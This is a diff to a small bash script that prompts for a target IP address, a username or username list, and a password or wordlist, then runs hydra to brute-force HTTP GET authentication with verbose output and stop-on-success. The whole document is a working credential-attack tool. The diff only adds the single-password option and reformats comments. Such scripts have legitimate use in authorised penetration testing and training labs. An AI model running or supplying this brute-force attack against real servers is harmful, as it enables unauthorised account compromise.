@@ -1,10 +1,16 @@
 #!/bin/bash
-#Ask User for HTTP IP Address.
+
+
+##### Ask User for HTTP IP Address #####
+
 
 echo Please enter the IP Address where the HTTP Get Request is located:
 read ipAddress
 
-#Determine if List or Single Username
+
+##### Determine Username(s) #####
+
+
 echo Are you using a single username? Or a List?
 echo Type 1 for Username.
 echo Type 2 for List.
@@ -12,6 +18,7 @@ echo Type 2 for List.
 read listOrUsername
 
 if [ $listOrUsername -eq 1 ]
+
 then
   echo Please enter a username to brute force:
   read userName
@@ -21,10 +28,29 @@ else
   echo Please enter the path to the list of usernames.
   read userName
   userNameArg="-L"
+
 fi
 
-#Ask User for wordlist from /usr/share/wordlists (NEEDS .txt extension)
-echo Please enter the path to the password wordlist:
-read wordListName
+##### Determine Password(s) #####
 
-hydra $ipAddress http-get -v -V $userNameArg $userName -P $wordListName -e ns -t 5 -w 30 -m / -f
+echo Are you using a single password? Or a list of passwords?
+echo Type 1 for Single.
+echo Type 2 for List.
+
+read listOrPassword 
+
+if [ $listOrPassword -eq 1 ]
+
+then
+  echo Please enter a password to brute force:
+  read passWord
+  passWordArg="-p"
+
+else
+  echo Please enter the path to the password wordlist you want to use:
+  read passWord
+  passWordArg="-P"
+
+fi
+
+hydra $ipAddress http-get -v -V $userNameArg $userName $passWordArg $passWord -e ns -t 5 -w 30 -m / -f
